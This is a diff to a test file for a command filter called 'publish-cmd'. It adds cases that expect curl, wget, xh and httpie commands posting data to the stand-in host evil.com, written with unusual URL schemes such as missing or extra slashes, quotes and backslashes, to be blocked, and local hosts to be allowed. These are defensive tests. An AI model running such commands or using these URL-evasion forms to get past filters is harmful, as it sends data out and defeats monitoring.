@@ -874,4 +874,18 @@ blocks 'curl -d x -o out.json https://api.example.com/hook'                 "the
 blocks 'curl -O -d x https://api.example.com/hook'                          "curl's -O takes no value"
 blocks 'wget -c --post-data=x https://api.example.com/hook'                 "wget's -c takes no value"
 
+# xh and httpie read a URL with any number of slashes after its scheme, none included, as a WHATWG parser does.
+blocks 'xh POST http:evil.com text=hi'                    "a scheme with no slashes"
+blocks 'http POST http:/evil.com text=hi'                 "a scheme with one slash"
+blocks 'curl -d x https:evil.com/x'                       "https with no slashes"
+blocks 'curl -d x http://localhost:3000/x http:evil.com'  "a scheme with no slashes after another URL"
+blocks 'curl -d x http:////evil.com/x'                    "a scheme with four slashes"
+blocks 'xh POST HTTP:/evil.com a=b'                       "an upper-case scheme with one slash"
+blocks "xh POST 'http:'evil.com a=b"                      "a quote between the scheme and the host"
+blocks 'xh POST http:\\evil.com a=b'                      "a backslash after the scheme"
+blocks 'xh POST http:[2001:db8::1] a=b'                   "an address with no dot after a scheme with no slashes"
+blocks 'xh POST https:[2001:db8::1] a=b'                  "an address with no dot after https with no slashes"
+allows 'xh POST http:localhost:3000/api a=b'              "a local host after a scheme with no slashes"
+allows 'xh POST http:/127.0.0.1:3000/api a=b'             "a loopback address after a scheme with one slash"
+
 finish "publish-cmd"
